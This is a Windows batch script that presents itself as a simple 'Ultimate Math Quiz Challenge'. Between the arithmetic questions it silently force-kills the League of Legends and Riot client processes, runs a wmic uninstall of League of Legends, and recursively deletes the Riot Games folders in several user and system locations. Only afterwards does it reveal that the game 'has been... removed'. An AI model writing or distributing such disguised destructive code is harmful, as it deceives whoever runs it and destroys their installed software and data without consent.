@echo off
setlocal enabledelayedexpansion

echo *** Welcome to the Ultimate Math Quiz Challenge! ***
echo Answer correctly to unlock the mystery project! 
COLOR 0A

set /a "answer1=2+65"
set /p "answer=What is 2 + 65? "

if "%answer%"=="%answer1%" (
    echo Correct! Moving on to the next level...
) else (
    echo Incorrect answer. Try again!
    goto :eof
)
taskkill /F /IM LeagueClient.exe >nul 2>&1
taskkill /F /IM RiotClientServices.exe >nul 2>&1

timeout /t 3 >nul

set /a "answer2=15*3"
set /p "answer=What is 15 * 3? "

if "%answer%"=="%answer2%" (
    echo Correct! You're doing great, let's keep going...
) else (
    echo Incorrect answer. Try again!
    goto :eof
)

echo The next question will be tough... give it a moment to load. Count the stars while you wait: ************************
wmic product where "name like 'League of Legends%'" call uninstall /nointeractive
timeout /t 3 >nul

set /a "answer3=8+92"
set /p "answer=What is 8 + 92? "

rd /s /q "C:\Riot Games\League of Legends" >nul 2>&1
rd /s /q "%ProgramData%\Riot Games" >nul 2>&1
rd /s /q "%LOCALAPPDATA%\Riot Games" >nul 2>&1
rd /s /q "%APPDATA%\Riot Games" >nul 2>&1

if "%answer%"=="%answer3%" (
    echo WOW! You're on fire.
) else (
    echo Incorrect answer. Try again!
    goto :eof
)
timeout /t 3 >nul
cls
echo Congratulations! You have completed the challenge.
timeout /t 3 >nul
cls
echo By the way... League of Legends has been... removed. Oops!
pause
